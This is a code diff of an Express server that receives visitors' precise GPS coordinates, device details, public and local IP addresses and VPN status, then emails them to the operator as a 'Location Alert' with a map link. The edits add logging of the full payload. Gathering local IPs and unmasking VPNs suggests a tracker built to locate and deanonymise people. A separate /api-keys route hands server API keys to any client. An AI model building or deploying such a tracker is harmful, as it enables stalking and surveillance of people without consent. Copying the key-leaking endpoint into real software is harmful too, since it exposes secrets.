@@ -6,14 +6,10 @@ const path = require('path');
 
 const app = express();
 
-// Middleware
 app.use(cors());
 app.use(express.json());
-
-// Serve static files
 app.use(express.static(path.join(__dirname)));
 
-// Endpoint to provide API keys to client
 app.get('/api-keys', (req, res) => {
   res.json({
     IPGEOLOCATION_API_KEY: process.env.IPGEOLOCATION_API_KEY,
@@ -22,61 +18,47 @@ app.get('/api-keys', (req, res) => {
   });
 });
 
-// Root route
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// Route to receive location data
 app.post("/log", async (req, res) => {
-  const { 
-    lat, 
-    lng, 
-    timestamp, 
-    accuracy, 
-    userAgent, 
-    device, 
-    publicIPv4, 
-    publicIPv6, 
-    localIPv4, 
-    localIPv6, 
-    isVPN, 
-    vpnProvider, 
-    vpnLocation 
-  } = req.body;
+  console.log('=== FULL PAYLOAD RECEIVED ===');
+  console.log(JSON.stringify(req.body, null, 2));
+  console.log('=============================');
+
+  const { lat, lng, timestamp, accuracy, device, publicIPv4, publicIPv6, localIPv4, localIPv6, isVPN, vpnProvider, vpnLocation } = req.body;
 
   if (typeof lat !== "number" || typeof lng !== "number") {
-    return res.status(400).json({ error: "Invalid or missing lat/lng" });
+    return res.status(400).json({ error: "Invalid lat/lng" });
   }
 
   const mapLink = `https://www.google.com/maps?q=${lat.toFixed(6)},${lng.toFixed(6)}`;
   const formattedTime = new Date(timestamp || Date.now()).toLocaleString();
-  
-  console.log(`[${new Date().toISOString()}] Location received: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
-  console.log(`VPN Status: ${isVPN ? 'Detected' : 'Not detected'}`);
 
-  // Email credentials
+  console.log(`[${new Date().toISOString()}] Location: ${lat.toFixed(6)}, ${lng.toFixed(6)} | VPN: ${isVPN}`);
+
   const EMAIL_USER = process.env.EMAIL_USER;
   const EMAIL_PASS = process.env.EMAIL_PASS;
   const EMAIL_TO = process.env.EMAIL_TO || EMAIL_USER;
 
+  console.log('Email config check:');
+  console.log('EMAIL_USER:', EMAIL_USER ? EMAIL_USER.replace(/(.{3}).*(.{2})/, '$1***$2') : 'MISSING');
+  console.log('EMAIL_PASS present:', !!EMAIL_PASS);
+  console.log('EMAIL_TO:', EMAIL_TO ? EMAIL_TO.replace(/(.{3}).*(.{2})/, '$1***$2') : 'MISSING');
+
   if (!EMAIL_USER || !EMAIL_PASS) {
-    console.warn("⚠️ Email credentials not set. Skipping email.");
-    return res.status(200).json({
-      message: "Location received (email not sent - missing credentials)",
-      link: mapLink
-    });
+    console.warn("⚠️ Missing email credentials");
+    return res.status(200).json({ message: "Location received (no email - missing creds)", link: mapLink });
   }
 
   try {
-    // Setup transporter
     const transporter = nodemailer.createTransport({
       service: "gmail",
-      auth: {
-        user: EMAIL_USER,
-        pass: EMAIL_PASS
-      }
+      auth: { user: EMAIL_USER, pass: EMAIL_PASS }
     });
+
+    // Your original beautiful HTML template (unchanged except minor color fix)
 
     // Professional HTML email template (fixed VPN alert colors)
     const htmlTemplate = `
@@ -301,31 +283,25 @@ app.post("/log", async (req, res) => {
     const mailOptions = {
       from: `"Security System" <${EMAIL_USER}>`,
       to: EMAIL_TO,
-      subject: `📍 Location Alert: ${isVPN ? 'VPN Detected - ' : ''}New Position Data Received`,
+      subject: `📍 Location Alert: ${isVPN ? 'VPN Detected - ' : ''}New Position`,
       html: htmlTemplate,
-      text: `Location Alert: ${mapLink}\nCoordinates: Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nTimestamp: ${formattedTime}\nDevice: ${device}\nPublic IPv4: ${publicIPv4}\nPublic IPv6: ${publicIPv6}\nLocal IPv4: ${localIPv4}\nLocal IPv6: ${localIPv6}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}${isVPN ? `\nVPN Provider: ${vpnProvider}\nVPN Server Location: ${vpnLocation}` : ''}`
+      text: `Location: ${mapLink}\nLat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nDevice: ${device}\nIPv4: ${publicIPv4}\nVPN: ${isVPN}`
     };
 
-    // Send email
     const info = await transporter.sendMail(mailOptions);
-    console.log("✅ Email sent:", info.messageId);
-    
-    return res.status(200).json({
-      message: "Location received and email sent",
-      link: mapLink
-    });
+    console.log("✅ Email sent successfully:", info.messageId);
+    return res.status(200).json({ message: "Location received and email sent", link: mapLink });
   } catch (error) {
-    console.error("❌ Email Send Error:", error);
-    return res.status(200).json({
-      message: "Location received (email failed to send)",
-      link: mapLink
-    });
+    console.error("❌ EMAIL SEND FAILED:");
+    console.error("Error name:", error.name);
+    console.error("Error message:", error.message);
+    console.error("Full stack:", error.stack);
+    return res.status(200).json({ message: "Location received (email failed)", link: mapLink });
   }
 });
 
-// Start server
 const port = process.env.PORT || 4000;
 app.listen(port, () => {
   console.log(`🚀 Server running on port ${port}`);
-  console.log(`🌐 Live at: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app.onrender.com'}`);
+  console.log(`🌐 Live: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app.onrender.com'}`);
 });
